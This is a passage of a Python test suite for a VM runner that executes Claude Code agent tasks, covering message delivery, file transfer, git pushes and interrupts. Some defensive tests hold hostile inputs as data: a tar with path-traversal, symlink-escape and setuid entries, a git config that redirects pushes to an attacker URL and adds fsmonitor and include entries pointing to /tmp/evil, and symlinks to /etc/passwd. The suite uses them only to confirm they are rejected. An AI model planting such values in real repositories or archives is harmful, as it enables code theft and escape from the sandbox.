        self.assertEqual(rc, 0)
        self.assertLess(took, 15)  # not the task's 30 second timeout
        self.assertTrue(os.path.exists(os.path.join(self.d, "eof")))

    def test_the_session_going_idle_ends_the_run(self):
        # its result says more turns wait, but none come: only Claude Code's session state says it's over,
        # which it sends only when asked to
        sent, rc, took = self._live(FAKE_CLAUDE_TURN="0.3", FAKE_CLAUDE_WAITING="1")
        self.assertEqual(rc, 0)
        self.assertLess(took, 10)
        self.assertTrue(os.path.exists(os.path.join(self.d, "eof")))

    def test_the_task_timeout_still_ends_a_live_run(self):
        sent, rc, took = self._live(timeout_s=2, FAKE_CLAUDE_HANG="1")
        self.assertNotEqual(rc, 0)
        self.assertLess(took, 15)

    def test_an_older_claude_code_runs_as_before(self):
        acks = []

        def during(sent, ctl):
            time.sleep(0.5)
            self.r.deliver_message({"task": "t1", "id": "abcd1234", "text": "hi"}, mock.Mock(send=lambda **m: acks.append(m)))
        # no --input-format at all: the prompt goes in as text
        sent, rc, _ = self._live(during, FAKE_CLAUDE_HELP="old")
        self.assertEqual((rc, acks[0]["result"]), (0, "unsupported"))
        self.assertFalse(os.path.exists(os.path.join(self.d, "stdin.jsonl")))
        self.assertNotIn("live", [m.get("type") for m in sent])
        self.assertEqual(self.r.STREAM_INPUT, {"claude": False})
        # stream-json, but without Claude Code's send-now: only the prompt, and its input closes at once
        acks.clear()
        sent, rc, took = self._live(during, FAKE_CLAUDE_CAPS="msg_lifecycle_v1", FAKE_CLAUDE_TURN="10")
        self.assertEqual((rc, acks[0]["result"]), (0, "unsupported"))
        self.assertEqual(len(self._stdin()), 1)
        self.assertNotIn("live", [m.get("type") for m in sent])
        self.assertLess(took, 8)  # not the turn's 10 seconds: the end of its input ended the turn

    def test_deliver_takes_only_well_formed_messages(self):
        r, got, acks = self.r, [], []
        live = mock.Mock(deliver=lambda text, mid: got.append(text) or "delivered")
        ctl = mock.Mock(send=lambda **m: acks.append(m))
        r.TASK_RUN.update(id="t1", live=live)
        try:
            for msg in ({"task": "t2", "id": "abcd1234", "text": "hi"}, {"task": "t1", "id": "../x", "text": "hi"},
                        {"task": "t1", "id": "abcd1234", "text": ""}, {"task": "t1", "id": "abcd1234", "text": "  \n"},
                        {"task": "t1", "id": "abcd1234", "text": ["hi"]}, {"task": "t1", "id": 5, "text": "hi"},
                        {"task": "t1", "id": "abcd1234", "text": "x" * 200_001}, {"task": "t1", "id": "abcd1234", "text": "a \ud800"},
                        {"task": ["t1"], "id": "abcd1234", "text": "hi"}):
                r.deliver_message(msg, ctl)
            self.assertEqual(got, [])
            self.assertEqual({a["result"] for a in acks}, {"unsupported"})
            r.TASK_RUN["interrupt"] = True  # you stopped it: nothing more goes in
            r.deliver_message({"task": "t1", "id": "abcd1234", "text": "hi"}, ctl)
            del r.TASK_RUN["interrupt"]
            r.deliver_message({"task": "t1", "id": "abcd1234", "text": "hi"}, ctl)
            self.assertEqual((got, acks[-2]["result"], acks[-1]["result"]), (["hi"], "unsupported", "delivered"))
        finally:
            r.TASK_RUN.clear()

    def test_research_outbox_keeps_its_images_for_the_chat(self):
        out, dst = os.path.join(self.d, "outbox"), os.path.join(self.d, "sent", "t1")
        os.makedirs(os.path.join(out, "sub"))
        for p in ("picture.png", "findings.md", "sub/nested.png"):
            open(os.path.join(out, p), "wb").write(b"x")
        os.symlink("/etc/hostname", os.path.join(out, "link.png"))
        self.r._h_archive_outbox(out, dst)
        self.assertEqual(os.listdir(out), ["picture.png"])  # sent text, folders and links move on
        self.assertEqual(sorted(os.listdir(dst)), ["findings.md", "link.png", "sub"])

    def test_recent_outbox_images(self):
        import time as _t
        out = os.path.join(self.d, "outbox")
        os.makedirs(os.path.join(out, "shots", "deep", "deeper"))
        old = os.path.join(out, "old.png")
        open(old, "wb").write(b"x")
        os.utime(old, (1000, 1000))
        since = _t.time() - 5
        for p in ("new.png", "shots/b.JPG", "shots/deep/c.webp", "shots/deep/deeper/too-deep.png", "notes.txt"):
            open(os.path.join(out, p), "wb").write(b"x")
        os.symlink("/etc/hostname", os.path.join(out, "link.png"))
        got = self.r._h_recent_images(out, since)
        self.assertEqual(sorted(got), ["new.png", "shots/b.JPG", "shots/deep/c.webp"])
        sent = []

        class Ctl:
            def send(self, **kw):
                sent.append(kw)
        self.r.report_outbox_images({"id": "t1"}, Ctl(), since)
        self.assertEqual(sent[0]["type"], "outbox_images")
        self.assertEqual(sorted(sent[0]["files"]), sorted(got))

    def test_list_files_shows_links_without_following_them(self):
        self._files_tree()
        [m] = self._call(self.r.list_files, {"path": ""})
        kinds = {e["name"]: e["kind"] for e in m["entries"]}
        self.assertEqual(kinds, {"notes": "dir", "report.md": "file", "link.txt": "link", "up": "link"})
        [m] = self._call(self.r.list_files, {"path": "notes"})
        self.assertEqual([(e["name"], e["size"]) for e in m["entries"]], [("a.txt", 100)])
        for bad in ("up", "up/outbox", "../", ".git", "link.txt"):
            [m] = self._call(self.r.list_files, {"path": bad})
            self.assertIn("error", m, bad)

    def test_read_file_streams_regular_files_only(self):
        import base64
        import hashlib
        self._files_tree()
        msgs = self._call(self.r.read_file, {"path": "notes/a.txt", "max_bytes": 1000})
        data = b"".join(base64.b64decode(m["data"]) for m in msgs if m["type"] == "file_chunk")
        self.assertEqual(data, b"x" * 100)
        self.assertEqual(msgs[-1], {"type": "file_end", "id": "abc123", "chunks": 1, "bytes": 100,
                                    "sha256": hashlib.sha256(data).hexdigest()})
        for path in ("link.txt", "up/secret.txt", "notes", "../secret.txt", "missing"):
            msgs = self._call(self.r.read_file, {"path": path, "max_bytes": 1000})
            self.assertEqual([m["type"] for m in msgs], ["file_failed"], path)
        msgs = self._call(self.r.read_file, {"path": "notes/a.txt", "max_bytes": 50})
        self.assertEqual(msgs[-1]["type"], "file_failed")

    def setUp(self):
        self.r = load_runner()
        self.tmp = tempfile.TemporaryDirectory()
        self.d = os.path.realpath(self.tmp.name)
        self.fake_pw = pwd.struct_passwd(("agent", "x", os.getuid(), os.getgid(), "", self.d, "/bin/sh"))
        self.p = [mock.patch.object(self.r.pwd, "getpwnam", lambda n: self.fake_pw),
                  mock.patch.object(self.r, "log", lambda m: None)]
        if os.getuid() != 0:
            # The runner drops to the agent user (setgroups needs root); unprivileged, we already are "the agent".
            def unprivileged(fn):
                return lambda *a, **kw: fn(*a, **{k: v for k, v in kw.items()
                                                    if k not in ("user", "group", "extra_groups")})
            self.p += [mock.patch.object(self.r.subprocess, "Popen", unprivileged(subprocess.Popen)),
                       mock.patch.object(self.r.subprocess, "run", unprivileged(subprocess.run))]
        for x in self.p:
            x.start()

    def tearDown(self):
        for x in self.p:
            x.stop()
        self.tmp.cleanup()

    def test_memory_export_is_accepted_by_host_import(self):
        """Guest export format must pass the host's strict validator."""
        from cilly import memory as M
        home = os.path.join(self.d, "claude")
        proj = os.path.join(home, "projects", "-home-agent-work-repo")
        os.makedirs(os.path.join(proj, "memory"))
        with open(os.path.join(proj, "s1.jsonl"), "w") as f:
            f.write('{"msg": "hi"}\n')
        with open(os.path.join(proj, "memory", "MEMORY.md"), "w") as f:
            f.write("notes")
        with open(os.path.join(home, "settings.json"), "w") as f:
            f.write("{}")  # must NOT be exported
        with open(os.path.join(proj, "weird(name).txt"), "w") as f:
            f.write("skipped: host would reject the name")
        os.symlink("/etc/passwd", os.path.join(proj, "link"))
        memout = os.path.join(self.d, "memout.img")
        with open(memout, "wb") as f:
            f.truncate(8 * 1024 * 1024)
        with mock.patch.object(self.r, "MEMOUT_DISK", memout), \
                mock.patch.object(self.r, "claude_home", lambda: home):
            self.r.export_memory()
        agent_dir = os.path.join(self.d, "agent")
        os.makedirs(agent_dir)
        res = M.import_memout(memout, agent_dir)
        self.assertTrue(res["imported"], res)
        got = sorted(os.path.relpath(os.path.join(dp, f), os.path.join(agent_dir, "memory"))
                     for dp, _, fs in os.walk(os.path.join(agent_dir, "memory")) for f in fs)
        self.assertEqual(got, ["projects/-home-agent-work-repo/memory/MEMORY.md",
                               "projects/-home-agent-work-repo/s1.jsonl"])

    def _transfer(self, size=64 << 20):
        path = os.path.join(self.d, "transfer.img")
        with open(path, "wb") as f:
            f.truncate(size)
        return path

    def _move(self, src, dst, disk):
        with mock.patch.object(self.r, "TRANSFER_DISK", disk):
            with mock.patch.object(self.r, "home_dir", lambda *p: os.path.join(src, *p)):
                self.r.export_home()
            with mock.patch.object(self.r, "home_dir", lambda *p: os.path.join(dst, *p)):
                return self.r.import_home()

    def test_a_home_folder_moves_whole(self):
        """Files, folders, modes, links and hard links arrive as they were; pipes don't."""
        src, dst = os.path.join(self.d, "old"), os.path.join(self.d, "new")
        for d in ("scratch/deep/er", ".claude/projects/-home-agent-scratch", "empty", "outbox"):
            os.makedirs(os.path.join(src, d))
        os.makedirs(dst)
        files = {"scratch/deep/er/panel.php": b"<?php echo 1;", ".claude/projects/-home-agent-scratch/s1.jsonl": b'{"m":1}\n',
                 "scratch/run.sh": b"#!/bin/sh\necho hi\n", "outbox/report.md": b"# Done\n", ".bashrc": b"alias ll='ls -l'\n"}
        for rel, data in files.items():
            with open(os.path.join(src, rel), "wb") as f:
                f.write(data)
        os.chmod(os.path.join(src, "scratch/run.sh"), 0o755)
        os.symlink("/etc/hostname", os.path.join(src, "abs-link"))
        os.symlink("deep/er", os.path.join(src, "scratch/short"))  # a link to a folder stays a link
        os.link(os.path.join(src, "outbox/report.md"), os.path.join(src, "outbox/same.md"))
        os.mkfifo(os.path.join(src, "pipe"))
        with open(os.path.join(dst, ".bashrc"), "w") as f:
            f.write("the new image's own\n")
        res = self._move(src, dst, self._transfer())
        for rel, data in files.items():
            with open(os.path.join(dst, rel), "rb") as f:
                self.assertEqual(f.read(), data, rel)  # its own .bashrc wins over the image's
        self.assertTrue(os.stat(os.path.join(dst, "scratch/run.sh")).st_mode & 0o100)
        self.assertEqual(os.readlink(os.path.join(dst, "abs-link")), "/etc/hostname")
        self.assertEqual(os.readlink(os.path.join(dst, "scratch/short")), "deep/er")
        self.assertTrue(os.path.isdir(os.path.join(dst, "empty")))
        self.assertTrue(os.path.samefile(os.path.join(dst, "outbox/report.md"), os.path.join(dst, "outbox/same.md")))
        self.assertFalse(os.path.lexists(os.path.join(dst, "pipe")))
        self.assertGreater(res["bytes"], 0)
        self.assertEqual(res["skipped"], 0)  # the pipe was never packed

    def test_a_damaged_transfer_disk_writes_nothing(self):
        src, dst = os.path.join(self.d, "old"), os.path.join(self.d, "new")
        os.makedirs(os.path.join(src, "scratch"))
        os.makedirs(dst)
        with open(os.path.join(src, "scratch/a.txt"), "w") as f:
            f.write("x" * 5000)
        disk = self._transfer()
        with mock.patch.object(self.r, "TRANSFER_DISK", disk):
            with mock.patch.object(self.r, "home_dir", lambda *p: os.path.join(dst, *p)):
                with self.assertRaisesRegex(RuntimeError, "no home folder"):
                    self.r.import_home()  # still empty
            with mock.patch.object(self.r, "home_dir", lambda *p: os.path.join(src, *p)):
                self.r.export_home()
            with open(disk, "r+b") as f:
                f.seek(self.r.TRANSFER_HEADER + 600)
                f.write(b"!")
            with mock.patch.object(self.r, "home_dir", lambda *p: os.path.join(dst, *p)):
                with self.assertRaisesRegex(RuntimeError, "don't match"):
                    self.r.import_home()
        self.assertEqual(os.listdir(dst), [])

    def test_unpacking_stays_inside_the_home_folder(self):
        """A tar written by a hostile VM: nothing lands outside the new home, and no setuid bits."""
        import hashlib
        import io
        dst = os.path.join(self.d, "new")
        os.makedirs(dst)
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w", format=tarfile.PAX_FORMAT) as tar:
            def add(name, data=b"x", **kw):
                ti = tarfile.TarInfo(name)
                for k, v in kw.items():
                    setattr(ti, k, v)
                ti.size = len(data) if ti.type == tarfile.REGTYPE else 0
                tar.addfile(ti, io.BytesIO(data) if ti.type == tarfile.REGTYPE else None)
            add("../escaped")
            add("/abs-escaped")
            add("scratch/../../escaped2")
            add("esc-link", type=tarfile.SYMTYPE, linkname=self.d)  # an outside folder, then a file through it
            add("esc-link/through-link")
            add("suid", mode=0o4755)
            add("dev", type=tarfile.CHRTYPE, devmajor=1, devminor=3)
            add("fine.txt", b"kept")
        data = buf.getvalue()
        disk = self._transfer()
        with open(disk, "r+b") as f:
            f.write(self.r.TRANSFER_MAGIC + json.dumps({"bytes": len(data), "sha256": hashlib.sha256(data).hexdigest()}).encode() + b"\n")
            f.seek(self.r.TRANSFER_HEADER)
            f.write(data)
        before = set(os.listdir(self.d))
        with mock.patch.object(self.r, "TRANSFER_DISK", disk), \
                mock.patch.object(self.r, "home_dir", lambda *p: os.path.join(dst, *p)):
            res = self.r.import_home()
        self.assertEqual(set(os.listdir(self.d)) - before, set())
        self.assertFalse(os.path.exists(os.path.join(self.d, "through-link")))
        self.assertFalse(os.path.exists("/abs-escaped"))
        with open(os.path.join(dst, "fine.txt")) as f:
            self.assertEqual(f.read(), "kept")
        self.assertFalse(os.stat(os.path.join(dst, "suid")).st_mode & 0o7000)
        self.assertFalse(os.path.lexists(os.path.join(dst, "dev")))
        self.assertGreaterEqual(res["skipped"], 4)

    def test_a_move_boot_only_moves_and_powers_off(self):
        sent, ran = [], []
        ctl = mock.Mock(send=lambda **kw: sent.append(kw))
        with mock.patch.object(self.r, "export_home", lambda: 1234), \
                mock.patch.object(self.r.subprocess, "run", lambda argv, **kw: ran.append(argv)):
            self.r.move_home("export", ctl)
        self.assertEqual(sent, [{"type": "phase", "phase": "move"}, {"type": "moved", "step": "export", "ok": True, "bytes": 1234}])
        self.assertEqual(ran, [["systemctl", "poweroff"]])
        sent.clear()
        with mock.patch.object(self.r, "import_home", mock.Mock(side_effect=RuntimeError("the transfer disk ends early"))), \
                mock.patch.object(self.r.subprocess, "run", lambda argv, **kw: ran.append(argv)):
            self.r.move_home("import", ctl)
        self.assertEqual(sent[-1], {"type": "moved", "step": "import", "ok": False, "error": "the transfer disk ends early"})
        # main() takes the move boot before the policy, the self-test or any task
        calls = []
        with mock.patch.multiple(self.r, read_boot=lambda: ({"agent_id": "a", "mode": "persistent", "move": "import"}, None),
                                 Control=lambda path: mock.Mock(recv=lambda: {"type": "hello", "policy": {}}),
                                 move_home=lambda kind, ctl: calls.append(kind),
                                 apply_policy=mock.Mock(side_effect=AssertionError("no policy on a move boot")),
                                 selftest=mock.Mock(side_effect=AssertionError("no self-test on a move boot")),
                                 LOG_PORT=os.path.join(self.d, "no-such-dir", "log")):  # no log file to leave open
            self.assertEqual(self.r.main(), 0)
        self.assertEqual(calls, ["import"])

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_sanitize_repo_config_drops_agent_settings(self):
        repo = os.path.join(self.d, "repo")
        subprocess.run(["git", "init", "-q", repo], check=True)
        cfgp = os.path.join(repo, ".git", "config")
        with open(cfgp, "a") as f:
            f.write('[url "https://github.com/attacker/"]\n\tpushInsteadOf = https://github.com/me/\n'
                    "[push]\n\tfollowTags = true\n[include]\n\tpath = /tmp/evil\n"
                    "[core]\n\tfsmonitor = /tmp/evil.sh\n")
        self.r.sanitize_repo_config(repo, "https://github.com/me/repo.git")
        with open(cfgp) as f:
            text = f.read()
        for bad in ("attacker", "followTags", "include", "fsmonitor"):
            self.assertNotIn(bad, text)
        url = subprocess.run(["git", "-C", repo, "config", "remote.origin.url"], capture_output=True).stdout
        self.assertEqual(url.strip(), b"https://github.com/me/repo.git")

    def test_outbox_collection_is_text_only_and_bounded(self):
        out = os.path.join(self.d, "outbox")
        os.makedirs(os.path.join(out, "sub"))
        with open(os.path.join(out, "a.md"), "w") as f:
            f.write("findings")
        with open(os.path.join(out, "sub", "b.md"), "w") as f:
            f.write("more")
        with open(os.path.join(out, "bin.dat"), "wb") as f:
            f.write(b"\xff\xfe\x00binary")
        with open(os.path.join(out, "big.md"), "w") as f:
            f.write("x" * 2000)
        os.symlink("/etc/passwd", os.path.join(out, "link.md"))
        files = self.r.collect_text_files(out, max_total=1000, max_file=1500)
        self.assertEqual(sorted(f["path"] for f in files), ["a.md", "sub/b.md"])
        from cilly import handoff as H
        self.assertEqual(H.validate_files(files, 1000)[1], 0)  # the host accepts what the guest sends

    def test_scratch_task_runs_claude_in_scratch(self):
        sent = []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        with mock.patch.object(self.r, "kill_agent_processes", lambda: None):
            self.r.run_scratch_task({"agent_id": "a"}, {"id": "t1", "instructions": "hi", "env": {},
                                                        "agent_argv": ["sh", "-c", "pwd > out.txt"]}, Ctl())
        self.assertEqual(sent[-1]["state"], "done")
        with open(os.path.join(self.d, "scratch", "out.txt")) as f:
            self.assertEqual(f.read().strip(), os.path.join(self.d, "scratch"))

    def test_scratch_task_sends_research_requests(self):
        # an agent without a repository asks a question the same way: one file per question in ~/requests/
        sent = []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        ask = "mkdir -p ~/requests && printf 'Does Node 22 load a file named x.jar.?' > ~/requests/node.md"
        with mock.patch.object(self.r, "kill_agent_processes", lambda: None):
            self.r.run_scratch_task({"agent_id": "a"}, {"id": "t1", "instructions": "hi", "env": {"HOME": self.d},
                                                        "agent_argv": ["sh", "-c", ask]}, Ctl())
        reqs = [m for m in sent if m["type"] == "research_requests"]
        self.assertEqual(len(reqs), 1, sent)
        self.assertEqual(reqs[0]["requests"], [{"name": "node", "text": "Does Node 22 load a file named x.jar.?"}])
        self.assertEqual(sent[-1]["state"], "done")
        self.assertFalse(os.path.exists(os.path.join(self.d, "requests", "node.md")))  # moved to ~/sent/

    def test_export_stream_is_accepted_by_host_and_skips_links(self):
        import base64
        from cilly.exports import safe_extract_tar
        src = os.path.join(self.d, "scratch")
        os.makedirs(os.path.join(src, "art"))
        with open(os.path.join(src, "art", "a.png"), "wb") as f:
            f.write(b"\x89PNG" + os.urandom(700_000))  # more than one chunk
        with open(os.path.join(src, "run.sh"), "w") as f:
            f.write("echo hi")
        os.chmod(os.path.join(src, "run.sh"), 0o755)
        os.symlink("/etc/passwd", os.path.join(src, "passwd"))
        os.symlink("/etc", os.path.join(src, "etcdir"))
        os.mkfifo(os.path.join(src, "fifo"))
        sent = []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        self.r.export_files({}, {"id": "e1", "what": "scratch"}, Ctl())
        self.assertEqual(sent[-1]["type"], "export_end", sent[-1])
        chunks = [m for m in sent if m["type"] == "export_chunk"]
        self.assertGreater(len(chunks), 1)
        self.assertEqual([m["seq"] for m in chunks], list(range(len(chunks))))
        tar = os.path.join(self.d, "e.tar")
        with open(tar, "wb") as f:
            for m in chunks:
                f.write(base64.b64decode(m["data"]))
        dest = os.path.join(self.d, "dest")
        os.mkdir(dest)
        res = safe_extract_tar(tar, dest, "x", max_bytes=10 << 20, max_files=100)
        self.assertEqual(sorted(res["files"]), ["art/a.png", "run.sh"])

    def test_export_unknown_source_or_limit(self):
        sent = []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        self.r.export_files({}, {"id": "e1", "what": "../etc"}, Ctl())
        self.assertEqual(sent[-1]["type"], "export_failed")
        os.makedirs(os.path.join(self.d, "scratch"))
        with open(os.path.join(self.d, "scratch", "big"), "wb") as f:
            f.write(os.urandom(2 << 20))
        self.r.export_files({}, {"id": "e2", "what": "scratch", "max_bytes": 1 << 20}, Ctl())
        self.assertEqual(sent[-1]["type"], "export_failed")

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_attach_lays_scratch_on_top_of_default_branch(self):
        env = {"PATH": os.environ["PATH"], "HOME": self.d, "GIT_CONFIG_NOSYSTEM": "1",
               "GIT_CONFIG_GLOBAL": os.path.join(self.d, "gc"), "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@x",
               "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@x"}
        origin = os.path.join(self.d, "origin.git")
        seed = os.path.join(self.d, "seed")

        def git(*a, cwd=None):
            return subprocess.run(["git", *a], cwd=cwd, env=env, check=True, capture_output=True).stdout.decode()
        git("init", "-q", "--bare", "-b", "main", origin)
        git("init", "-q", "-b", "main", seed)
        for name, text in (("README.md", "repo readme"), ("LICENSE", "license")):
            with open(os.path.join(seed, name), "w") as f:
                f.write(text)
        git("add", ".", cwd=seed)
        git("commit", "-q", "-m", "init", cwd=seed)
        git("push", "-q", origin, "main", cwd=seed)
        gc = os.path.join(self.d, "gitconfig")
        with open(gc, "w") as f:
            f.write(f'[user]\n\tname = bot\n\temail = bot@x\n[url "file://{origin}"]\n\tinsteadOf = https://github.com/me/repo.git\n'
                    "[init]\n\tdefaultBranch = main\n")
        scratch = os.path.join(self.d, "scratch")
        os.makedirs(os.path.join(scratch, ".claude"))
        with open(os.path.join(scratch, "README.md"), "w") as f:
            f.write("scratch readme")
        with open(os.path.join(scratch, "game.py"), "w") as f:
            f.write("print('hi')")
        with open(os.path.join(scratch, ".claude", "settings.json"), "w") as f:
            f.write("{}")
        os.makedirs(os.path.join(scratch, ".git"))  # the agent's own git init: moved aside
        sent = []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        boot = {"identity": {"name": "bot", "email": "bot@x"}}
        with mock.patch.object(self.r, "GLOBAL_GITCONFIG", gc), \
                mock.patch.object(self.r, "open_pr", lambda *a: "https://github.com/me/repo/pull/1"):
            self.r.run_attach(boot, {"id": "t9", "repo": "me/repo", "branch": "agent/x-1", "env": {"GH_TOKEN": "t"},
                                     "commit_exclude": [".claude"]}, Ctl())
        self.assertEqual(sent[-1]["state"], "done", sent)
        self.assertEqual(sent[-1]["pr"], "https://github.com/me/repo/pull/1")
        self.assertEqual(boot["repo"], "me/repo")
        self.assertTrue(boot["repo_in_scratch"])
        self.assertEqual(self.r.repo_dir_for(boot), scratch)
        self.assertTrue(os.path.isdir(os.path.join(self.d, "scratch-git-t9")))
        files = sorted(git("ls-tree", "-r", "--name-only", "agent/x-1", cwd=origin).split())
        self.assertEqual(files, ["LICENSE", "README.md", "game.py"])
        self.assertEqual(git("show", "agent/x-1:README.md", cwd=origin), "scratch readme")
        self.assertEqual(git("rev-parse", "agent/x-1~1", cwd=origin), git("rev-parse", "main", cwd=origin))
        with open(os.path.join(scratch, "LICENSE")) as f:
            self.assertEqual(f.read(), "license")  # brought back into the working folder

    def _origin(self):
        """A local repo standing in for github.com/me/repo, and a git() to look into it."""
        env = {"PATH": os.environ["PATH"], "HOME": self.d, "GIT_CONFIG_NOSYSTEM": "1",
               "GIT_CONFIG_GLOBAL": os.path.join(self.d, "gc"), "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@x",
               "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@x"}
        origin, seed = os.path.join(self.d, "origin.git"), os.path.join(self.d, "seed")

        def git(*a, cwd=None):
            return subprocess.run(["git", *a], cwd=cwd, env=env, check=True, capture_output=True).stdout.decode()
        git("init", "-q", "--bare", "-b", "main", origin)
        git("init", "-q", "-b", "main", seed)
        with open(os.path.join(seed, "README.md"), "w") as f:
            f.write("hi")
        git("add", ".", cwd=seed)
        git("commit", "-q", "-m", "init", cwd=seed)
        git("push", "-q", origin, "main", cwd=seed)
        gc = os.path.join(self.d, "gitconfig")
        with open(gc, "w") as f:
            f.write(f'[user]\n\tname = bot\n\temail = bot@x\n[url "file://{origin}"]\n'
                    "\tinsteadOf = https://github.com/me/repo.git\n")
        return gc, lambda *a: git(*a, cwd=origin)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_first_task_clones_commits_and_pushes(self):
        """The real run_task path against a local repo (the fake VM never runs it)."""
        gc, git_origin = self._origin()
        sent = []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        boot = {"repo": "me/repo", "identity": {}}
        task = {"id": "t1", "branch": "agent/x", "instructions": "add a file", "env": {"GH_TOKEN": "t"},
                "agent_argv": ["sh", "-c", "echo made > new.txt"], "commit_exclude": [".claude"]}
        with mock.patch.object(self.r, "GLOBAL_GITCONFIG", gc), \
                mock.patch.object(self.r, "kill_agent_processes", lambda: None), \
                mock.patch.object(self.r, "open_pr", lambda *a: "https://github.com/me/repo/pull/2"):
            self.r.run_task(boot, task, Ctl())
        self.assertEqual(sent[-1]["state"], "done", sent)
        self.assertEqual(sent[-1]["pr"], "https://github.com/me/repo/pull/2")
        self.assertEqual(git_origin("show", "agent/x:new.txt"), "made\n")
        self.assertEqual(self.r.load_state(), {"conversation": {os.path.join(self.d, "work", "repo"): True}, "interrupted": {}})

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_the_agent_names_its_branch(self):
        """It renames the branch with git branch -m before it's pushed.  A name GitHub already has for
        someone else's branch gets -2, at the start and at the push, and a name the panel doesn't
        allow is ignored."""
        gc, git_origin = self._origin()
        git_origin("branch", "fix/login-timeout", "main")  # someone's, made from main
        git_origin("branch", "feat/login", "main")
        pattern = r"(?:feat|fix|docs|refactor|test|chore)/(?=.{1,60}$)[a-z0-9]+(?:-[a-z0-9]+)*"

        class Ctl:
            def __init__(self):
                self.sent = []

            def send(self, **m):
                self.sent.append(m)
        cases = (("t1", "feat/login", "git branch -m fix/login-timeout", "fix/login-timeout-2"),
                 ("t2", "feat/menu", "git branch -m Main", "feat/menu"),
                 ("t3", "feat/login", "true", "feat/login-2"))
        for tid, branch, rename, final in cases:
            ctl = Ctl()
            task = {"id": tid, "branch": branch, "branch_fresh": True, "branch_rename": pattern, "instructions": "x",
                    "env": {"GH_TOKEN": "t"}, "commit_exclude": [],
                    "agent_argv": ["sh", "-c", f"echo {tid} > {tid}.txt && git add . && git commit -qm {tid} && {rename}"]}
            with mock.patch.object(self.r, "GLOBAL_GITCONFIG", gc), \
                    mock.patch.object(self.r, "kill_agent_processes", lambda: None), \
                    mock.patch.object(self.r, "open_pr", lambda *a: "https://github.com/me/repo/pull/3"):
                self.r.run_task({"repo": "me/repo", "identity": {}}, task, ctl)
            self.assertEqual((ctl.sent[-1]["state"], ctl.sent[-1]["branch"]), ("done", final), (tid, ctl.sent))
            self.assertEqual(git_origin("show", f"{final}:{tid}.txt"), f"{tid}\n")
        self.assertEqual(git_origin("rev-parse", "fix/login-timeout"), git_origin("rev-parse", "main"))  # theirs untouched

    def test_devices_under_the_old_names(self):
        """A disk from before the rename boots under vmpanel's names to move its home folder: the runner
        finds its disks and ports there when cilly's aren't."""
        d = os.path.join(self.d, "dev")
        os.makedirs(d)
        cilly, old = os.path.join(d, "virtio-cilly-task"), os.path.join(d, "virtio-vmpanel-task")
        self.assertEqual(self.r._device(cilly), cilly)  # neither: cilly's name, as always
        open(old, "w").close()
        self.assertEqual(self.r._device(cilly), old)
        open(cilly, "w").close()
        self.assertEqual(self.r._device(cilly), cilly)  # both: cilly's

    def _fake_claude(self):
        """A claude that says something, writes new.txt and, while ./slow exists, keeps working.
        With ./broken, --continue fails at once, the way a conversation left broken would."""
        path = os.path.join(self.d, "bin", "claude")
        os.makedirs(os.path.dirname(path))
        with open(path, "w") as f:
            f.write(f"""#!/bin/sh
echo "$*" >> {self.d}/claude-calls
if [ "$1" = --continue ] && [ -f {self.d}/broken ]; then echo "No conversation found to continue"; exit 1; fi
echo '{{"type":"assistant","message":{{"content":[{{"type":"text","text":"on it"}}]}}}}'
echo made >> new.txt
if [ -f {self.d}/slow ]; then exec sleep 30; fi
""")
        os.chmod(path, 0o755)
        return path

    def _task(self, gc, tid, cont=False, interrupt=None):
        """run_task the way the runner's worker starts it.  interrupt: "claude" while Claude works,
        or "push" right as the branch is pushed.  Returns what was sent and the interrupt's answer."""
        r, sent, acks = self.r, [], []

        class Ctl:
            def __init__(self, out):
                self.out = out

            def send(self, **m):
                self.out.append(m)
        task = {"id": tid, "branch": "agent/x", "instructions": "work", "env": {"GH_TOKEN": "t"},
                "agent_argv": [self.claude, "-p", "{instructions}"], "continue": cont, "continue_args": ["--continue"],
                "commit_exclude": [".claude"]}
        real_run = r.run_as_agent

        def run(argv, *a, **kw):
            if interrupt == "push" and "push" in argv:
                r.interrupt_task({"task": tid}, Ctl(acks))
                time.sleep(0.3)
            return real_run(argv, *a, **kw)
        with mock.patch.object(r, "GLOBAL_GITCONFIG", gc), mock.patch.object(r, "kill_agent_processes", lambda: None), \
                mock.patch.object(r, "open_pr", lambda *a: "https://github.com/me/repo/pull/2"), \
                mock.patch.object(r, "run_as_agent", run):
            r.TASK_RUN.update(id=tid, claude_over=False)
            th = threading.Thread(target=r.run_task, args=({"repo": "me/repo", "identity": {}}, task, Ctl(sent)))
            start = time.time()
            th.start()
            if interrupt == "claude":
                calls = os.path.join(self.d, "claude-calls")
                while time.time() - start < 20 and not (os.path.exists(calls) and open(calls).read().count("\n") > self.runs):
                    time.sleep(0.05)
                time.sleep(0.3)
                r.interrupt_task({"task": tid}, Ctl(acks))
            th.join(30)
            r.TASK_RUN.clear()
        self.assertFalse(th.is_alive())
        self.runs = open(os.path.join(self.d, "claude-calls")).read().count("\n")
        return sent, acks, time.time() - start

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_interrupt_ends_claude_and_the_task_finishes_up(self):
        gc, git_origin = self._origin()
        self.claude, self.runs = self._fake_claude(), 0
        open(os.path.join(self.d, "slow"), "w").close()
        sent, acks, took = self._task(gc, "t1", interrupt="claude")
        self.assertEqual([a["result"] for a in acks], ["stopping"])
        self.assertLess(took, 20)  # not the fake's 30 seconds
        self.assertEqual((sent[-1]["state"], sent[-1]["pr"]), ("interrupted", "https://github.com/me/repo/pull/2"), sent)
        self.assertEqual(git_origin("show", "agent/x:new.txt"), "made\n")  # what was there got committed and pushed
        repo = os.path.join(self.d, "work", "repo")
        self.assertEqual(self.r.load_state(), {"conversation": {repo: True}, "interrupted": {repo: True}})
        # the next message continues the same conversation
        os.unlink(os.path.join(self.d, "slow"))
        sent, acks, _ = self._task(gc, "t2", cont=True)
